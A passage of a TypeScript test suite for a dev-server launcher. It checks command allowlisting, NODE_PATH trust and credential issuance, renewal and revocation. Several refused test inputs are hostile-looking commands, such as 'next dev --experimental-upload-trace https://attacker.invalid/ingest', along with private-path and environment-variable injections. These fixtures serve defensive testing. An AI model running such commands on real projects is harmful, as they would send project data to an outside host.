    expect(errorSurfaces(error)).not.toContain(planted);
    expect(serializedRecords(harness.records)).not.toContain(planted);
  }
  return error;
}

describe('DevServerLauncher.launch: dev-server arguments outside the Next.js allowlist', () => {
  /** A harness whose project's dev-server script is `dev`, with its own CLI installed. */
  function argumentHarness(): Harness {
    return createHarness({
      projectRoot: makeProjectWithTrustedCli('argument-policy'),
      detection: { devServerScripts: ['dev'] },
    });
  }

  it.each([
    { command: 'next dev /home/dev/private', planted: '/home/dev/private' },
    {
      command: 'node node_modules/next/dist/bin/next dev ../../private',
      planted: '../../private',
    },
    { command: 'pnpm run dev /elsewhere', planted: '/elsewhere' },
    {
      command: 'next dev --experimental-upload-trace https://attacker.invalid/ingest',
      planted: 'attacker.invalid',
    },
    {
      command: 'next dev --experimental-upload-trace=https://attacker.invalid/ingest',
      planted: 'attacker.invalid',
    },
    {
      command: 'pnpm run dev --experimental-upload-trace=https://attacker.invalid/ingest',
      planted: 'attacker.invalid',
    },
    { command: 'next dev --inspect' },
    { command: 'next dev --experimental-https-key /tmp/k.pem', planted: 'k.pem' },
    { command: 'next dev -p 0' },
    { command: 'next dev -p 70000' },
    { command: 'next dev -p abc' },
  ])(
    'refuses $command as argument-not-allowed, minting and spawning nothing',
    async ({ command, planted }) => {
      await expectRefusedBeforeStart(argumentHarness(), command, 'argument-not-allowed', planted);
    },
  );

  it.each([
    { command: 'NEXT_PRIVATE_DEV_DIR=/home/dev/private next dev', planted: '/home/dev/private' },
    { command: 'NEXT_TRACE_UPLOAD_FULL=1 next dev', planted: 'NEXT_TRACE_UPLOAD_FULL' },
  ])(
    'refuses $command as env-assignment-not-allowed, minting and spawning nothing',
    async ({ command, planted }) => {
      await expectRefusedBeforeStart(
        argumentHarness(),
        command,
        'env-assignment-not-allowed',
        planted,
      );
    },
  );

  it.each([
    { command: 'next dev --port 4173', file: 'next', args: ['dev', '--port', '4173'] },
    {
      command: 'next dev -p 4173 -H 127.0.0.1 --turbopack',
      file: 'next',
      args: ['dev', '-p', '4173', '-H', '127.0.0.1', '--turbopack'],
    },
    {
      command: 'next dev --hostname=127.0.0.1 --port=4173',
      file: 'next',
      args: ['dev', '--hostname=127.0.0.1', '--port=4173'],
    },
    {
      command: 'NEXT_TELEMETRY_DISABLED=1 NEXT_OTEL_VERBOSE=1 next dev --webpack',
      file: 'next',
      args: ['dev', '--webpack'],
    },
  ])('spawns $command with its options as given', async ({ command, file, args }) => {
    const harness = argumentHarness();

    await launchReady(harness, { command });

    const call = harness.spawner.call(0);
    expect(call.command).toBe(file);
    expect(call.args).toEqual(args);
    expect(harness.issuer.issue).toHaveBeenCalledOnce();
  });
});

describe('DevServerLauncher.launch: the -- separator of a package-manager run', () => {
  it.each(['pnpm run dev -- --port 4174', 'npm run dev --port 4174'])(
    'refuses %s as argument-not-allowed, minting and spawning nothing',
    async (command) => {
      const harness = createHarness({ detection: { devServerScripts: ['dev'] } });

      await expectRefusedBeforeStart(harness, command, 'argument-not-allowed');
    },
  );

  it.each([
    { command: 'pnpm run dev --port 4174', file: 'pnpm', args: ['run', 'dev', '--port', '4174'] },
    {
      command: 'npm run dev -- --port 4174',
      file: 'npm',
      args: ['run', 'dev', '--', '--port', '4174'],
    },
    { command: 'yarn dev --port 4174', file: 'yarn', args: ['dev', '--port', '4174'] },
    { command: 'bun run dev --webpack', file: 'bun', args: ['run', 'dev', '--webpack'] },
  ])('spawns $command as given, recording the script', async ({ command, file, args }) => {
    const harness = createHarness({ detection: { devServerScripts: ['dev'] } });

    await launchReady(harness, { command });

    const call = harness.spawner.call(0);
    expect(call.command).toBe(file);
    expect(call.args).toEqual(args);
    expect(harness.launcher.list()[0]?.script).toBe('dev');
  });
});

describe('DevServerLauncher.launch: only a dev-server script runs, never any declared script', () => {
  /**
   * A project whose manifest declares two dev-server scripts beside scripts
   * that start no dev server, launched through real detection — so what the
   * launcher admits is what `./detect.js` classifies from `package.json`.
   */
  function manifestHarness(): Harness {
    const projectRoot = makeSandbox('dev-server-scripts');
    writeFileSync(
      join(projectRoot, 'package.json'),
      `${JSON.stringify({
        name: 'atlas-console',
        private: true,
        packageManager: 'pnpm@9.15.0',
        scripts: {
          dev: 'next dev',
          'dev:web': 'next dev --port 4200',
          deploy: 'vercel deploy --prod',
          lint: 'eslint .',
          postinstall: 'node ./scripts/setup.js',
        },
        devDependencies: { next: '16.3.5' },
      })}\n`,
    );
    return createHarness({ projectRoot, detect: detectDevServer });
  }

  it.each([
    { command: 'pnpm run deploy', planted: 'vercel' },
    { command: 'pnpm run lint', planted: 'eslint' },
    { command: 'npm run postinstall', planted: 'setup.js' },
    { command: 'yarn deploy', planted: 'vercel' },
    { command: 'bun run lint', planted: 'eslint' },
  ])(
    'refuses $command, declared but starting no dev server, as script-not-declared',
    async ({ command, planted }) => {
      const harness = manifestHarness();

      const error = await expectRefusedBeforeStart(
        harness,
        command,
        'script-not-declared',
        planted,
      );
      expect(error.details).toStrictEqual({ reason: 'script-not-declared' });
      expect(error.message).toContain('dev-server scripts');
      expect(error.hint).toContain('dev-server scripts');
    },
  );

  it.each([
    { command: 'pnpm run dev', args: ['run', 'dev'], script: 'dev' },
    {
      command: 'pnpm run dev:web --port 4174',
      args: ['run', 'dev:web', '--port', '4174'],
      script: 'dev:web',
    },
  ])('spawns $command, a dev-server script', async ({ command, args, script }) => {
    const harness = manifestHarness();

    await launchReady(harness, { command });

    const call = harness.spawner.call(0);
    expect(call.command).toBe('pnpm');
    expect(call.args).toEqual(args);
    expect(harness.launcher.list()[0]?.script).toBe(script);
  });

  it('runs the detected dev script when the request names no command', async () => {
    const harness = manifestHarness();

    await launchReady(harness);

    const call = harness.spawner.call(0);
    expect([call.command, ...call.args]).toEqual(['pnpm', 'run', 'dev']);
  });
});

describe('DevServerLauncher.launch: a NODE_PATH the service does not trust', () => {
  it.runIf(POSIX_HOST)(
    'refuses a NODE_PATH directory that does not exist, minting and spawning nothing',
    async () => {
      const missing = join(makeSandbox('launch-absent-modules'), 'node_modules');

      await expectRefusedBeforeStart(
        createHarness(),
        `NODE_PATH=${missing} next dev --port 4173`,
        'node-path-not-allowed',
        missing,
      );
    },
  );

  it.runIf(POSIX_HOST)(
    'refuses a world-writable NODE_PATH directory, minting and spawning nothing',
    async () => {
      const writable = modulesDirectory('launch-writable-modules', 0o777);

      await expectRefusedBeforeStart(
        createHarness(),
        `NODE_PATH=${writable} next dev --port 4173`,
        'node-path-not-allowed',
        writable,
      );
    },
  );

  it('asks the injected isTrustedDevDirectory, and spawns once it trusts every entry', async () => {
    const entry = '/home/dev/toolchain/node_modules';
    const refusing = vi.fn((path: string) => path !== entry);
    await expectRefusedBeforeStart(
      createHarness({ deps: { isTrustedDevDirectory: refusing } }),
      `NODE_PATH=${entry} next dev`,
      'node-path-not-allowed',
    );
    expect(refusing).toHaveBeenCalledExactlyOnceWith(entry);

    const trusting = vi.fn((path: string) => path === entry);
    const harness = createHarness({ deps: { isTrustedDevDirectory: trusting } });
    await launchReady(harness, { command: `NODE_PATH=${entry} next dev` });

    expect(trusting).toHaveBeenCalledExactlyOnceWith(entry);
    expect(harness.spawner.call(0).options.env['NODE_PATH']).toBe(entry);
  });
});

// ---------------------------------------------------------------------------
// The credential route: the protocol's devServer.credential operation
// ---------------------------------------------------------------------------

describe('the dev-server credential route contract', () => {
  it('is the devServer.credential row of the protocol route table: POST /dev-server/credential', () => {
    const route = HTTP_ROUTES['devServer.credential'];

    expect(DEV_SERVER_CREDENTIAL_PATH).toBe(route.pattern);
    expect(DEV_SERVER_CREDENTIAL_METHOD).toBe(route.method);
    // The stable wire path clients and scripts/dev-instrumented.mjs call.
    expect(DEV_SERVER_CREDENTIAL_PATH).toBe('/dev-server/credential');
    expect(DEV_SERVER_CREDENTIAL_METHOD).toBe('POST');
    expect(buildPath('devServer.credential')).toBe(DEV_SERVER_CREDENTIAL_PATH);
  });

  // The route is a row of the table like every other service route, so no
  // route is registered beside the table and no second owner of the path exists.
  it('is claimed by exactly one of the twenty-one protocol operations, which requires a credential', () => {
    expect(HTTP_OPERATIONS).toHaveLength(21);

    const claiming = HTTP_OPERATIONS.filter(
      (operation) =>
        HTTP_ROUTES[operation].method === DEV_SERVER_CREDENTIAL_METHOD &&
        HTTP_ROUTES[operation].pattern === DEV_SERVER_CREDENTIAL_PATH,
    );
    expect(claiming).toEqual(['devServer.credential']);
    expect(HTTP_ROUTES['devServer.credential'].authExempt).toBe(false);
  });

  it('answers with the protocol response schema itself, never a restated copy', () => {
    expect(devServerCredentialResponseSchema).toBe(protocolCredentialResponseSchema);
    expect(HTTP_ROUTES['devServer.credential'].response).toBe(devServerCredentialResponseSchema);
  });

  describe('devServerCredentialInputSchema', () => {
    it('accepts an absolute project root', () => {
      expect(
        devServerCredentialInputSchema.safeParse({ projectRoot: '/home/dev/atlas-console' })
          .success,
      ).toBe(true);
    });

    it.each([
      { label: 'a missing projectRoot', body: {} },
      { label: 'an empty projectRoot', body: { projectRoot: '' } },
      { label: 'a relative projectRoot', body: { projectRoot: 'relative-marker/atlas-console' } },
      { label: 'a non-string projectRoot', body: { projectRoot: 4173 } },
      { label: 'an unknown key', body: { projectRoot: '/home/dev/atlas-console', scope: 'all' } },
    ])('rejects $label without echoing the value', ({ body }) => {
      const parsed = devServerCredentialInputSchema.safeParse(body);

      expect(parsed.success).toBe(false);
      const issues = JSON.stringify(parsed.error?.issues ?? []);
      expect(issues).not.toContain('relative-marker');
      expect(issues).not.toContain('4173');
    });

    it('is the protocol request schema with only the absolute-path check layered on', () => {
      const relative = { projectRoot: 'relative-marker/atlas-console' };
      const absolute = { projectRoot: '/home/dev/atlas-console' };

      // The Node-neutral protocol schema checks shape only, so it admits a
      // relative root; the launcher's schema refuses exactly that and agrees on
      // everything else, the strict key set included.
      expect(protocolCredentialRequestSchema.safeParse(relative).success).toBe(true);
      expect(devServerCredentialInputSchema.safeParse(relative).success).toBe(false);
      expect(devServerCredentialInputSchema.parse(absolute)).toEqual(
        protocolCredentialRequestSchema.parse(absolute),
      );
      expect(Object.keys(devServerCredentialInputSchema.shape)).toEqual(
        Object.keys(protocolCredentialRequestSchema.shape),
      );
    });
  });

  describe('devServerCredentialResponseSchema', () => {
    it('accepts a token with an epoch-millisecond expiry', () => {
      const body = {
        token: fixtureCredential(1),
        expiresAt: FIXED_NOW + DEFAULT_CLI_CREDENTIAL_LEASE_MS,
      };

      expect(devServerCredentialResponseSchema.parse(body)).toEqual(body);
    });

    it.each([
      { label: 'a non-numeric expiry', expiresAt: 'tomorrow' },
      { label: 'NaN', expiresAt: Number.NaN },
      { label: 'Infinity', expiresAt: Number.POSITIVE_INFINITY },
      { label: 'a negative expiry', expiresAt: -1 },
      { label: 'a seconds-precision expiry', expiresAt: Math.floor(FIXED_NOW / 1000) },
      { label: 'a nanosecond-scale expiry', expiresAt: FIXED_NOW * 1_000_000 },
    ])('rejects $label', ({ expiresAt }) => {
      expect(
        devServerCredentialResponseSchema.safeParse({ token: fixtureCredential(1), expiresAt })
          .success,
      ).toBe(false);
    });

    it('rejects an empty or missing token and an unknown key', () => {
      const expiresAt = FIXED_NOW + 1_000;

      expect(devServerCredentialResponseSchema.safeParse({ token: '', expiresAt }).success).toBe(
        false,
      );
      expect(devServerCredentialResponseSchema.safeParse({ expiresAt }).success).toBe(false);
      expect(
        devServerCredentialResponseSchema.safeParse({
          token: fixtureCredential(1),
          expiresAt,
          role: 'vscode',
        }).success,
      ).toBe(false);
    });
  });
});

describe('DevServerLauncher.issueCredential', () => {
  it('pins the lease settings the command-line client documents: 5 min lease, 2 s checks, 20 s grace', () => {
    expect(DEFAULT_CLI_CREDENTIAL_LEASE_MS).toBe(5 * 60 * 1000);
    expect(CLI_CREDENTIAL_CHECK_INTERVAL_MS).toBe(2_000);
    expect(CLI_CREDENTIAL_DISCONNECT_GRACE_MS).toBe(20_000);
  });

  it('delegates to the issuer with exactly the requested project scope and the end of the first lease', async () => {
    const harness = createHarness();

    const issued = expectOk(
      await harness.launcher.issueCredential({ projectRoot: harness.projectRoot }),
    );

    // Strictly these two keys: no `lease` flag, which marks a launched child's
    // credential for the access boundary's orphan sweep.
    const expiresAt = FIXED_NOW + DEFAULT_CLI_CREDENTIAL_LEASE_MS;
    expect(harness.issuer.issue).toHaveBeenCalledTimes(1);
    expect(harness.issuer.issue.mock.calls[0]?.[0]).toStrictEqual({
      projectRoot: harness.projectRoot,
      expiresAt,
    });
    expect(issued).toStrictEqual({ token: harness.issuer.tokens[0], expiresAt });
    expect(devServerCredentialResponseSchema.safeParse(issued).success).toBe(true);
    // Minting a credential launches nothing.
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
    expect(harness.detect).not.toHaveBeenCalled();
    expect(harness.issuer.revoke).not.toHaveBeenCalled();
  });

  it('never logs the plaintext token', async () => {
    const harness = createHarness();

    const issued = expectOk(
      await harness.launcher.issueCredential({ projectRoot: harness.projectRoot }),
    );

    expect(serializedRecords(harness.records)).not.toContain(issued.token);
    const issuedRecord = harness.records.find((record) =>
      record.message.startsWith('Issued a server-agent'),
    );
    expect(issuedRecord?.fields).toMatchObject({
      projectRoot: harness.projectRoot,
      expiresAt: issued.expiresAt,
    });
  });

  it("returns the issuer's own expiry when it states one", async () => {
    const expiresAt = FIXED_NOW + 60_000;
    const harness = createHarness({
      issuer: createIssuer((_input, token) => ok({ token, expiresAt })),
    });

    const issued = expectOk(
      await harness.launcher.issueCredential({ projectRoot: harness.projectRoot }),
    );

    expect(issued.expiresAt).toBe(expiresAt);
  });

  it('honours a configured credential lease', async () => {
    const harness = createHarness({ deps: { cliCredentialLeaseMs: 90_000 } });

    const issued = expectOk(
      await harness.launcher.issueCredential({ projectRoot: harness.projectRoot }),
    );

    expect(issued.expiresAt).toBe(FIXED_NOW + 90_000);
    expect(harness.issuer.issue.mock.calls[0]?.[0]?.expiresAt).toBe(FIXED_NOW + 90_000);
  });

  it("surfaces the issuer's typed refusal as the same Err", async () => {
    const refusal = new DebuggenError('STORE_ERROR', 'The credentials table is unavailable.');
    const harness = createHarness({ issuer: createIssuer(() => err(refusal)) });

    const result = await harness.launcher.issueCredential({ projectRoot: harness.projectRoot });

    expect(expectErr(result, 'STORE_ERROR')).toBe(refusal);
  });

  it('turns an issuer that throws into a typed STORE_ERROR', async () => {
    const issuer = createIssuer();
    issuer.issue.mockImplementation(() => {
      throw new Error('database is locked');
    });
    const harness = createHarness({ issuer });

    const result = await harness.launcher.issueCredential({ projectRoot: harness.projectRoot });

    expectErr(result, 'STORE_ERROR', 'credential-issue-failed');
  });

  it('refuses an invalid request before asking the issuer, echoing nothing', async () => {
    const harness = createHarness();

    const result = await harness.launcher.issueCredential({
      projectRoot: 'relative-marker/atlas-console',
    });

    const error = expectErr(result, 'PROJECT_NOT_FOUND', 'invalid-credential-request');
    expect(errorSurfaces(error)).not.toContain('relative-marker');
    expect(harness.issuer.issue).not.toHaveBeenCalled();
  });

  it('revokes an issued credential whose expiry breaks the response schema, and never echoes it', async () => {
    const harness = createHarness({
      issuer: createIssuer((_input, token) =>
        ok({ token, expiresAt: Math.floor(FIXED_NOW / 1000) }),
      ),
    });

    const result = await harness.launcher.issueCredential({ projectRoot: harness.projectRoot });

    const error = expectErr(result, 'INTERNAL', 'credential-response-invalid');
    const token = harness.issuer.tokens[0] ?? '';
    expect(errorSurfaces(error)).not.toContain(token);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke.mock.calls[0]?.[0]).toMatchObject({
      projectRoot: harness.projectRoot,
      token,
    });
  });

  it('refuses after dispose', async () => {
    const harness = createHarness();
    await harness.launcher.dispose();

    const result = await harness.launcher.issueCredential({ projectRoot: harness.projectRoot });

    expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'shutting-down');
    expect(harness.issuer.issue).not.toHaveBeenCalled();
  });

  it('revokes, instead of handing out, a credential whose issuance completed after dispose began', async () => {
    const harness = createHarness();
    const answer = deferred<Result<ServerAgentCredential, DebuggenError>>();
    harness.issuer.issue.mockImplementationOnce(() => answer.promise);
    const token = fixtureCredential(7);

    const pending = harness.launcher.issueCredential({ projectRoot: harness.projectRoot });
    const disposing = harness.launcher.dispose();
    answer.resolve(ok({ token, credentialId: 'cred-late' }));

    const error = expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'shutting-down');
    await disposing;
    expect(errorSurfaces(error)).not.toContain(token);
    expect(revokedTokens(harness.issuer)).toEqual([token]);
  });
});

// ---------------------------------------------------------------------------
// issueCredential — the supervised lease (CWE-613)
// ---------------------------------------------------------------------------

/** One lease of a credential route credential, at the default settings. */
const CLI_LEASE_MS = DEFAULT_CLI_CREDENTIAL_LEASE_MS;

/** How often such a lease is renewed while its dev server is connected: a third of a lease. */
const CLI_RENEW_EVERY_MS = CLI_LEASE_MS / LEASE_RENEWALS_PER_LEASE;

/** A connected-client view double: which credentials hold an online control connection. */
interface FakeConnections {
  readonly view: ServerAgentConnections;
  readonly isCredentialConnected: Mock<ServerAgentConnections['isCredentialConnected']>;
  /** A preload connects with `token`. */
  readonly connect: (token: string) => void;
  /** The preload's control connection with `token` goes away — its dev server exited. */
  readonly disconnect: (token: string) => void;
}

function createConnections(): FakeConnections {
  const online = new Set<string>();
  const isCredentialConnected = vi.fn<ServerAgentConnections['isCredentialConnected']>(
    (tokenHash) => online.has(tokenHash),
  );
  return {
    view: { isCredentialConnected },
    isCredentialConnected,
    connect: (token) => {
      online.add(sha256Hex(token));
    },
    disconnect: (token) => {
      online.delete(sha256Hex(token));
    },
  };
}

/**
 * A harness on Vitest's fake timers and clock, starting at {@link FIXED_NOW},
 * whose launcher reads a {@link FakeConnections} view. `options.deps` still
 * applies last.
 */
function supervisedHarness(
  options: HarnessOptions = {},
): Harness & { readonly connections: FakeConnections } {
  vi.useFakeTimers();
  vi.setSystemTime(FIXED_NOW);
  const connections = createConnections();
  const harness = createHarness({
    ...options,
    deps: { now: () => Date.now(), serverAgentConnections: connections.view, ...options.deps },
  });
  return { ...harness, connections };
}

/** Mint a credential route credential through the harness; its token. */
async function issueLease(harness: Harness): Promise<string> {
  return expectOk(await harness.launcher.issueCredential({ projectRoot: harness.projectRoot }))
    .token;
}

/** The token each revocation named, in call order. */
function revokedTokens(issuer: FakeIssuer): string[] {
  return issuer.revoke.mock.calls.map(([input]) => input.token);
}

/** The records whose message contains `fragment`. */
function recordsMentioning(records: readonly LogRecord[], fragment: string): LogRecord[] {
  return records.filter((record) => record.message.includes(fragment));
}

/** A store refusal for a renewal or a revocation. */
function storeBusy(): Result<never, DebuggenError> {
  return err(new DebuggenError('STORE_ERROR', 'The credentials table is busy.'));
}

describe('DevServerLauncher.issueCredential: the supervised lease', () => {
  it('renews the lease while its control connection is online, across several leases, never more often than every third of a lease', async () => {
    const harness = supervisedHarness();
    const renewedAt: number[] = [];
    harness.issuer.renew.mockImplementation(() => {
      renewedAt.push(Date.now());
      return ok(true);
    });
    const token = await issueLease(harness);
    harness.connections.connect(token);

    await vi.advanceTimersByTimeAsync(CLI_RENEW_EVERY_MS - 1);
    expect(harness.issuer.renew).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(1);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(1);
    expect(harness.issuer.renew.mock.calls[0]?.[0]).toMatchObject({
      projectRoot: harness.projectRoot,
      token,
      expiresAt: FIXED_NOW + CLI_RENEW_EVERY_MS + CLI_LEASE_MS,
    });

    // Three more leases: one renewal per third of a lease, each to one lease
    // from its own moment, and the credential is never revoked.
    await vi.advanceTimersByTimeAsync(3 * CLI_LEASE_MS);
    expect(renewedAt).toHaveLength(10);
    renewedAt.forEach((at, index) => {
      expect(at).toBe(FIXED_NOW + (index + 1) * CLI_RENEW_EVERY_MS);
      expect(harness.issuer.renew.mock.calls[index]?.[0].expiresAt).toBe(at + CLI_LEASE_MS);
    });
    expect(harness.issuer.revoke).not.toHaveBeenCalled();
  });

  it('revokes exactly that credential once its control connection has been gone for the disconnect grace', async () => {
    const harness = supervisedHarness();
    const departing = await issueLease(harness);
    const staying = await issueLease(harness);
    harness.connections.connect(departing);
    harness.connections.connect(staying);
    await vi.advanceTimersByTimeAsync(10_000);

    // Its dev server exits: the preload's control connection goes away.
    harness.connections.disconnect(departing);
    await vi.advanceTimersByTimeAsync(CLI_CREDENTIAL_DISCONNECT_GRACE_MS - 1);
    expect(harness.issuer.revoke).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(1);
    expect(revokedTokens(harness.issuer)).toEqual([departing]);
    const ended = recordsMentioning(harness.records, 'its dev server disconnected');
    expect(ended).toHaveLength(1);
    expect(ended[0]?.level).toBe('info');
    expect(ended[0]?.fields).toMatchObject({
      projectRoot: harness.projectRoot,
      revocationPending: false,
    });
    const logged = serializedRecords(harness.records);
    expect(logged).not.toContain(departing);
    expect(logged).not.toContain(staying);

    // The project's other dev server keeps its credential, renewed as before.
    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS);
    expect(revokedTokens(harness.issuer)).toEqual([departing]);
    expect(harness.issuer.renew).toHaveBeenCalled();
    expect(harness.issuer.renew.mock.calls.map(([input]) => input.token)).toEqual(
      harness.issuer.renew.mock.calls.map(() => staying),
    );
  });

  it('keeps a credential whose control connection returns within the grace', async () => {
    const harness = supervisedHarness();
    const token = await issueLease(harness);
    harness.connections.connect(token);
    await vi.advanceTimersByTimeAsync(10_000);

    // A dropped socket, reconnected two seconds before the grace ends.
    harness.connections.disconnect(token);
    await vi.advanceTimersByTimeAsync(
      CLI_CREDENTIAL_DISCONNECT_GRACE_MS - CLI_CREDENTIAL_CHECK_INTERVAL_MS,
    );
    harness.connections.connect(token);
    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS);

    expect(harness.issuer.revoke).not.toHaveBeenCalled();
    expect(harness.issuer.renew).toHaveBeenCalled();
  });

  it('revokes a credential no preload connected with at the end of its first lease, and stops checking', async () => {
    const harness = supervisedHarness();
    const token = await issueLease(harness);

    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS - 1);
    expect(harness.issuer.revoke).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(1);
    expect(revokedTokens(harness.issuer)).toEqual([token]);
    expect(harness.issuer.renew).not.toHaveBeenCalled();
    expect(
      recordsMentioning(harness.records, 'no dev server connected with it during its first lease'),
    ).toHaveLength(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('renews nothing without a connection view, and revokes the credential at the end of its first lease', async () => {
    const harness = supervisedHarness({ deps: { serverAgentConnections: undefined } });
    const token = await issueLease(harness);
    harness.connections.connect(token);

    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS);

    expect(harness.connections.isCredentialConnected).not.toHaveBeenCalled();
    expect(harness.issuer.renew).not.toHaveBeenCalled();
    expect(revokedTokens(harness.issuer)).toEqual([token]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('ends supervision without a revocation when the renewal finds the credential gone', async () => {
    const harness = supervisedHarness();
    harness.issuer.renew.mockReturnValue(ok(false));
    const token = await issueLease(harness);
    harness.connections.connect(token);

    await vi.advanceTimersByTimeAsync(CLI_RENEW_EVERY_MS);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(1);
    expect(vi.getTimerCount()).toBe(0);

    // Rotated or revoked elsewhere: neither a later disconnect, the lease's
    // end nor the shutdown asks the store about it again.
    harness.connections.disconnect(token);
    await vi.advanceTimersByTimeAsync(2 * CLI_LEASE_MS);
    await harness.launcher.dispose();
    expect(harness.issuer.renew).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke).not.toHaveBeenCalled();
    const gone = recordsMentioning(harness.records, 'no longer exists');
    expect(gone).toHaveLength(1);
    expect(gone[0]?.level).toBe('warn');
  });

  it('retries a failed renewal at the next check, logging only the first failure of a run', async () => {
    const harness = supervisedHarness();
    harness.issuer.renew.mockReturnValueOnce(storeBusy()).mockImplementationOnce(() => {
      throw new Error('database is locked');
    });
    const token = await issueLease(harness);
    harness.connections.connect(token);

    await vi.advanceTimersByTimeAsync(CLI_RENEW_EVERY_MS);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(1);
    await vi.advanceTimersByTimeAsync(CLI_CREDENTIAL_CHECK_INTERVAL_MS);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(2);
    await vi.advanceTimersByTimeAsync(CLI_CREDENTIAL_CHECK_INTERVAL_MS);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(3);
    const renewedAt = FIXED_NOW + CLI_RENEW_EVERY_MS + 2 * CLI_CREDENTIAL_CHECK_INTERVAL_MS;
    expect(harness.issuer.renew.mock.calls[2]?.[0].expiresAt).toBe(renewedAt + CLI_LEASE_MS);

    // Renewed: the next renewal is a third of a lease after this one.
    await vi.advanceTimersByTimeAsync(CLI_RENEW_EVERY_MS - 1);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(3);
    await vi.advanceTimersByTimeAsync(1);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(4);

    const failures = recordsMentioning(harness.records, 'Renewing the credential lease');
    expect(failures).toHaveLength(1);
    expect(failures[0]?.level).toBe('warn');
    expect(harness.issuer.revoke).not.toHaveBeenCalled();
    expect(serializedRecords(harness.records)).not.toContain(token);
  });

  it('revokes a connected credential whose every renewal failed once its lease is over', async () => {
    const harness = supervisedHarness();
    harness.issuer.renew.mockReturnValue(storeBusy());
    const token = await issueLease(harness);
    harness.connections.connect(token);

    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS - 1);
    expect(harness.issuer.revoke).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(1);
    expect(revokedTokens(harness.issuer)).toEqual([token]);
    expect(recordsMentioning(harness.records, 'its lease ended without a renewal')).toHaveLength(1);
    expect(recordsMentioning(harness.records, 'Renewing the credential lease')).toHaveLength(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('counts a connection view that throws as disconnected, and logs it', async () => {
    const harness = supervisedHarness();
    const token = await issueLease(harness);
    harness.connections.connect(token);
    await vi.advanceTimersByTimeAsync(10_000);

    harness.connections.isCredentialConnected.mockImplementation(() => {
      throw new Error('registry unavailable');
    });
    await vi.advanceTimersByTimeAsync(CLI_CREDENTIAL_DISCONNECT_GRACE_MS);

    expect(revokedTokens(harness.issuer)).toEqual([token]);
    const unreadable = recordsMentioning(
      harness.records,
      'could not read the connected server agents',
    );
    expect(unreadable.length).toBeGreaterThan(0);
    expect(unreadable.every((record) => record.level === 'warn')).toBe(true);
  });

  it('is revoked by dispose, and left alone by stop, stopForSession and stopAll', async () => {
    const harness = supervisedHarness();
    const token = await issueLease(harness);
    harness.connections.connect(token);

    expect(expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot }))).toEqual({
      stopped: false,
    });
    expectOk(await harness.launcher.stopForSession('session-atlas-1'));
    await harness.launcher.stopAll();
    await vi.advanceTimersByTimeAsync(CLI_RENEW_EVERY_MS);
    expect(harness.issuer.revoke).not.toHaveBeenCalled();
    expect(harness.issuer.renew).toHaveBeenCalledTimes(1);

    await harness.launcher.dispose();
    expect(revokedTokens(harness.issuer)).toEqual([token]);
    expect(vi.getTimerCount()).toBe(0);

    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
  });

  it('hands a revocation the store refuses to the pending retries', async () => {
    const harness = supervisedHarness();
    harness.issuer.revoke.mockReturnValueOnce(storeBusy());
    const token = await issueLease(harness);
    harness.connections.connect(token);
    await vi.advanceTimersByTimeAsync(10_000);
    harness.connections.disconnect(token);

    await vi.advanceTimersByTimeAsync(CLI_CREDENTIAL_DISCONNECT_GRACE_MS);
    expect(revokedTokens(harness.issuer)).toEqual([token]);
    expect(
      recordsMentioning(harness.records, 'its dev server disconnected')[0]?.fields,
    ).toMatchObject({ revocationPending: true });

    // The retry after the first backoff revokes it; nothing asks again after that.
    await vi.advanceTimersByTimeAsync(REVOCATION_RETRY_INITIAL_MS);
    expect(revokedTokens(harness.issuer)).toEqual([token, token]);
    await vi.advanceTimersByTimeAsync(CLI_LEASE_MS);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(2);
    expect(vi.getTimerCount()).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// launch — over the fake spawn (no dev server is ever started)
// ---------------------------------------------------------------------------

describe('DevServerLauncher.launch: the spawn', () => {
  it('spawns in the project root, without a shell, with piped output and exactly the preload environment', async () => {
    const harness = createHarness();

    const { launch, child } = await launchReady(harness, { sessionId: 'ses-alpha' });

    const { command, args, options } = harness.spawner.call(0);
    const token = harness.issuer.tokens[0] ?? '';
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(1);
    expect(options.cwd).toBe(harness.projectRoot);
    expect(options.stdio).toEqual(['ignore', 'pipe', 'pipe']);
    expect(options.shell).toBe(false);
    expect(options.windowsVerbatimArguments).toBe(false);
    expect(options.windowsHide).toBe(true);
    // No process-group signaller was injected, so no fake pid is ever group-signalled.
    expect(options.detached).toBe(false);
    expect(options.env).toStrictEqual(
      buildDevServerEnv({
        parentEnv: harness.parentEnv,
        projectRoot: harness.projectRoot,
        ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
        token,
        preloadPath: harness.preloadPath,
        platform: POSIX,
      }),
    );
    expect(changedKeys(harness.parentEnv, options.env)).toEqual([...INJECTED_KEYS].sort());
    expect(command).toBe('pnpm');
    expect(args).toEqual(['run', DEFAULT_SCRIPT.name]);
    expect(launch.pid).toBe(child.pid);
  });

  it('hands the child the minimal environment: never the provider key or a service-only setting', async () => {
    const harness = createHarness({ parentEnv: SERVICE_ENV });

